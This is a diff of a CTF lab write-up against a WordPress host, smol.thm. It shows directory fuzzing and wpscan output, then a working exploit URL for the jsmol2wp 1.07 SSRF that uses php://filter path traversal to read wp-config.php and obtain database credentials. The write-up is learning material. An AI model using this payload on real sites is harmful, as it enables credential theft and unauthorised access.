@@ -109,11 +109,56 @@ While accessing the folder `wp-admin`, a login portal just appeared and I attemp
 ![Screenshot_2025-09-27_16_35_00](https://github.com/user-attachments/assets/a0a9424e-901e-43e8-afa9-00cf49bdaa36)
 
 
-So I think that I need bruteforce to find the password because I already got the username. Waiting for the long time but I did not get any useful results which means I can't just easily break it
+So I think that I need bruteforce to find the password because I already got the username. Waiting for the long time but I did not get any useful results which means I can't just easily break it.
+I tried to do more fuzzing endpoints for `wp-inludes` and got this result
+```
+/assets               (Status: 301) [Size: 325] [--> http://www.smol.thm/wp-includes/assets/]
+/images               (Status: 301) [Size: 325] [--> http://www.smol.thm/wp-includes/images/]
+/css                  (Status: 301) [Size: 322] [--> http://www.smol.thm/wp-includes/css/]
+/js                   (Status: 301) [Size: 321] [--> http://www.smol.thm/wp-includes/js/]
+/blocks               (Status: 301) [Size: 325] [--> http://www.smol.thm/wp-includes/blocks/]
+/widgets              (Status: 301) [Size: 326] [--> http://www.smol.thm/wp-includes/widgets/]
+/fonts                (Status: 301) [Size: 324] [--> http://www.smol.thm/wp-includes/fonts/]
+/customize            (Status: 301) [Size: 328] [--> http://www.smol.thm/wp-includes/customize/]
+/certificates         (Status: 301) [Size: 331] [--> http://www.smol.thm/wp-includes/certificates/]
+/Text                 (Status: 301) [Size: 323] [--> http://www.smol.thm/wp-includes/Text/]
+/sitemaps             (Status: 301) [Size: 327] [--> http://www.smol.thm/wp-includes/sitemaps/]
+/l10n                 (Status: 301) [Size: 323] [--> http://www.smol.thm/wp-includes/l10n/]
+/Requests             (Status: 301) [Size: 327] [--> http://www.smol.thm/wp-includes/Requests/]
+```
+`wp-content`
+```
+plugins                 [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 339ms]
+upgrade                 [Status: 200, Size: 776, Words: 52, Lines: 16, Duration: 349ms]
+                        [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 335ms]
+```
+Nothing at all, I am a bit stuck at there. I searched for more things to do and found that there is another tool specifically is used for gathering information from WordPress which is `wpscan`, a default tool on kali linux
+```
+wpscan --url http://www.smol.thm
+...
+[+] jsmol2wp
+ | Location: http://www.smol.thm/wp-content/plugins/jsmol2wp/
+ | Latest Version: 1.07 (up to date)
+ | Last Updated: 2018-03-09T10:28:00.000Z
+ |
+ | Found By: Urls In Homepage (Passive Detection)
+ |
+ | Version: 1.07 (100% confidence)
+ | Found By: Readme - Stable Tag (Aggressive Detection)
+ |  - http://www.smol.thm/wp-content/plugins/jsmol2wp/readme.txt
+ | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)
+ |  - http://www.smol.thm/wp-content/plugins/jsmol2wp/readme.txt
 
+```
+Remember the main page included some vulnerabilities, I assume that those would be the vulnerabilities of this server. So I tried to search for this un usual endpoint after `wpscan`
+## JSmol2WP <= 1.07 - Unauthenticated Server Side Request Forgery (SSRF)
+```
+http://www.smol.thm/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=getRawDataFromDatabase&query=php://filter/resource=../../../../wp-config.php
+```
+Here is the reference [link](https://wpscan.com/vulnerability/ad01dad9-12ff-404f-8718-9ebbd67bf611/)
+and it works, that is crazy.
+<img width="1599" height="878" alt="Screenshot_2025-09-28_23-02-18" src="https://github.com/user-attachments/assets/aebb6d62-6643-4375-ad8f-a12d1d75b2f9" />
 
-
-
-
+So I got database credential
 
 
